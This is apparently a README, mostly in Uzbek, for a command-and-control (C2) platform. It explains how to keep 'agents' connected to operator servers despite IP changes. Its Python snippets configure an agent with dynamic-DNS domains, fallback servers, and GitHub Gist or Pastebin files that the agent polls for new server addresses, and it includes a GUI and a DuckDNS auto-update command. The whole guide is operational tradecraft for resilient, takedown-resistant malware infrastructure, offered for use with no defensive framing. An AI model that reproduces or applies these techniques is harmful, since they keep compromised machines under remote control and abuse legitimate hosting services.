# 🚀 C2 Platform - Complete Guide

## 📖 Mundarija

1. [Serverlarni Ishga Tushirish](#serverlarni-ishga-tushirish)
2. [IP O'zgarishi Muammosi](#ip-ozgarishi-muammosi)
3. [Yechimlar](#yechimlar)
4. [Smart Agent](#smart-agent)
5. [GUI Sozlamalari](#gui-sozlamalari)

---

## Serverlarni Ishga Tushirish

### Barcha Serverlar Bir Vaqtda:

```bash
python start_all_servers.py
```

Yoki:
```bash
START_ALL.bat  # Windows
./START_ALL.sh # Linux/Mac
```

---

## IP O'zgarishi Muammosi

### ❌ Muammo:

Agar serveringiz IP manzili o'zgarsa:
- Home internet: ISP IP ni har kuni o'zgartiradi
- Cloud VPS: Restart qilganda IP o'zgaradi
- Mobile hotspot: Har safar yangi IP

**Natija:** Agent server bilan aloqani yo'qotadi!

---

## ✅ Yechimlar

### 1️⃣ Dynamic DNS (DDNS) - ENG YAXSHI

Domain name ishlatiladi, IP emas.

**Afzalliklari:**
- ✅ IP o'zgarsa ham ishlaydi
- ✅ Bepul providerlar mavjud
- ✅ Professional ko'rinish
- ✅ Setup: 5 daqiqa

**Tavsiya etiladigan providerlar:**

| Provider | Narx | Domain | Setup |
|----------|------|--------|-------|
| **DuckDNS** | Bepul | cheksiz | ⭐⭐⭐⭐⭐ |
| **No-IP** | Bepul (3) | 3 ta | ⭐⭐⭐⭐ |
| **Cloudflare** | Bepul | cheksiz | ⭐⭐⭐⭐⭐ |

**Setup:**
1. https://www.duckdns.org ga kiring
2. `yourname.duckdns.org` domain oling
3. Auto-update script qo'shing
4. Agent'da domain ishlatng:
   ```python
   client.add_server('yourname.duckdns.org', 9999)
   ```

📖 **Batafsil:** [docs/DYNAMIC_IP_GUIDE.md](docs/DYNAMIC_IP_GUIDE.md)

---

### 2️⃣ Fallback Serverlar

Bir nechta backup server qo'shing:

```python
from agent.smart_client import SmartClient

client = SmartClient()

# Primary
client.add_server('primary.example.com', 9999)

# Backups
client.add_server('backup1.example.com', 9999)
client.add_server('backup2.example.com', 9999)
client.add_server('123.45.67.89', 9999)  # Direct IP

client.run()
```

**Qanday ishlaydi:**
1. Primary serverga ulanadi
2. Ishlamasa → Backup1 ga o'tadi
3. Ishlamasa → Backup2 ga o'tadi
4. Va hokazo...

---

### 3️⃣ IP Update Server (GitHub Gist)

Yangi IP ni online file'da saqlang.

**Setup:**

1. **GitHub Gist yaratish:**
   - https://gist.github.com ga kiring
   - Yangi gist: `server_config.json`
   
   ```json
   {
     "server_ip": "123.45.67.89",
     "backup_ips": [
       "98.76.54.32",
       "11.22.33.44"
     ],
     "updated_at": "2025-12-23 10:00:00"
   }
   ```

2. **Raw URL oling:**
   ```
   https://gist.githubusercontent.com/username/gist_id/raw/server_config.json
   ```

3. **Agent'da ishlatish:**
   ```python
   client = SmartClient()
   
   # Fallback server
   client.add_server('old-server.com', 9999)
   
   # IP update source
   client.add_ip_update_source('github_gist',
       'https://gist.githubusercontent.com/user/id/raw/config.json')
   
   # Har 5 daqiqada yangi IP tekshiriladi
   client.run()
   ```

4. **IP o'zgarganda:**
   - Gist ni yangilang
   - Agent avtomatik 5 daqiqada yangi IP ni topadi
   - Qayta ulanadi

---

## Smart Agent

### Oddiy Client vs Smart Client

**Oddiy Client (agent/client.py):**
```python
# ❌ Muammo: IP o'zgarsa ishlamaydi
client.connect('127.0.0.1', 9999)
```

**Smart Client (agent/smart_client.py):**
```python
# ✅ Yechim: Multiple servers + IP update
client = SmartClient()

# DDNS domain
client.add_server('yourname.duckdns.org', 9999)

# Fallback IPs
client.add_server('backup.example.com', 9999)
client.add_server('123.45.67.89', 9999)

# IP update
client.add_ip_update_source('github_gist', 'URL')

# Auto-reconnect
client.run()
```

### Smart Client Features:

- ✅ Multiple fallback servers
- ✅ Auto IP update (GitHub Gist, Pastebin)
- ✅ Auto-reconnect on disconnect
- ✅ 5-second timeout per server
- ✅ 3 retries per server
- ✅ Background IP checking (every 5 min)

---

## GUI Sozlamalari

GUI'da IP management:

### 1. GUI'ni Oching:

```bash
python gui/modular_gui.py
```

### 2. "🌐 IP Boshqarish" Tugmasini Bosing

4 ta tab ochiladi:

#### Tab 1: 🔄 Fallback Serverlar

Backup serverlar qo'shing:

1. Host/IP kiriting
2. Port kiriting
3. "➕ Qo'shish"
4. Ro'yxatda ko'rinadi

#### Tab 2: 🔍 IP Update

**GitHub Gist:**
1. Raw URL kiriting
2. "➕ Gist URL Qo'shish"
3. Agent har 5 daqiqada tekshiradi

**Pastebin:**
1. Raw URL kiriting
2. "➕ Pastebin URL Qo'shish"

#### Tab 3: ⚙️ Config Generator

GitHub Gist uchun config yaratish:

1. Primary IP kiriting
2. Backup IPs kiriting (har satrda 1ta)
3. "🔧 Generate"
4. "📋 Copy"
5. GitHub Gist ga yuklang

#### Tab 4: 🌐 DDNS Info

DDNS providers haqida ma'lumot va link.

---

## 🎯 Recommended Setup

**Production setup (eng xavfsiz):**

### 1. DDNS Setup (DuckDNS):

```bash
# 1. Account yarating: duckdns.org
# 2. Domain: yourname.duckdns.org
# 3. Auto-update (cron/task scheduler):
echo url="https://www.duckdns.org/update?domains=yourname&token=TOKEN&ip=" | curl -k -K -
```

### 2. GitHub Gist Backup:

```json
{
  "server_ip": "yourname.duckdns.org",
  "backup_ips": [
    "backup.yourdomain.com",
    "123.45.67.89"
  ]
}
```

### 3. Agent Configuration:

```python
from agent.smart_client import SmartClient

client = SmartClient()

# Primary: DDNS domain
client.add_server('yourname.duckdns.org', 9999)

# Backup: Direct IP
client.add_server('123.45.67.89', 9999)

# IP update: GitHub Gist
client.add_ip_update_source('github_gist',
    'https://gist.githubusercontent.com/user/id/raw/config.json')

# Settings
client.retry_delay = 5  # 5 sekund
client.max_retries = 3  # 3 marta
client.update_check_interval = 300  # 5 daqiqa

# Run
client.run()
```

### 4. Server Monitoring:

```bash
# Serverlarni ishga tushirish + monitoring
python start_all_servers.py
```

---

## 📊 Complete Workflow

```
┌─────────────────────────────────────────┐
│  1. Server Setup                        │
│  ─────────────────                      │
│  • DuckDNS: yourname.duckdns.org        │
│  • Auto-update script (har 5 daqiqa)    │
│  • GitHub Gist: server_config.json      │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  2. Server Start                        │
│  ─────────────────                      │
│  python start_all_servers.py            │
│  • 8 ta server ishga tushadi            │
│  • Monitoring active                    │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  3. Agent Start                         │
│  ─────────────────                      │
│  python examples/smart_agent_example.py │
│  • DDNS domain ga ulanadi               │
│  • Fallback IPs ready                   │
│  • IP update checker active             │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  4. IP Changes (ISP restart)            │
│  ─────────────────────────────────────  │
│  Old: 1.2.3.4 → New: 5.6.7.8            │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  5. Auto Update                         │
│  ─────────────────                      │
│  • DuckDNS auto-updates domain          │
│  • GitHub Gist updated (optional)       │
│  • Agent checks new IP (5 daqiqada)     │
└─────────────────────────────────────────┘
           │
           ▼
┌─────────────────────────────────────────┐
│  6. Agent Reconnects                    │
│  ─────────────────                      │
│  • Domain resolves to new IP            │
│  • Agent reconnects automatically       │
│  • Connection restored!                 │
└─────────────────────────────────────────┘
```

---

## 🛠️ Troubleshooting

### Agent ulanolmayapti:

**1. Server ishlayaptimi?**
```bash
netstat -ano | findstr "9999"  # Windows
netstat -tuln | grep 9999      # Linux
```

**2. DDNS domain to'g'rimi?**
```bash
ping yourname.duckdns.org
nslookup yourname.duckdns.org
```

**3. IP update ishlayaptimi?**
```bash
# GitHub Gist URL ni browser'da oching
# server_ip ko'rsatilishi kerak
```

**4. Firewall?**
```bash
# Port ochiq ekanligini tekshiring
telnet server_ip 9999
```

### IP o'zgarganda agent bog'lanmayapti:

**1. DDNS auto-update ishlayaptimi?**
- DuckDNS: https://www.duckdns.org/domains
- IP current ekanligini tekshiring

**2. Agent IP update check qilyaptimi?**
- `update_check_interval = 300` (5 daqiqa)
- Log'da "🔍 IP update tekshirilmoqda..." ko'rinishi kerak

**3. GitHub Gist yangilangan?**
- Gist'da yangi IP bormi tekshiring
- Raw URL to'g'rimi?

---

## 💡 Pro Tips

1. **DDNS + Fallback**: Ikkalasini birga ishlatng
2. **Private Gist**: Public gist xavfli
3. **Multiple Backups**: 3+ server qo'shing
4. **Monitoring**: Server logs tekshiring
5. **SSL/TLS**: HTTPS protokol ishlatng

---

## 📚 Qo'shimcha Resources

- **DDNS Guide**: [docs/DYNAMIC_IP_GUIDE.md](docs/DYNAMIC_IP_GUIDE.md)
- **Smart Agent Example**: [examples/smart_agent_example.py](examples/smart_agent_example.py)
- **IP Updater Module**: [common/ip_updater.py](common/ip_updater.py)
- **Smart Client**: [agent/smart_client.py](agent/smart_client.py)

---

✅ **Tayyor!** Endi IP o'zgarsa ham agent ishlaydi! 🚀
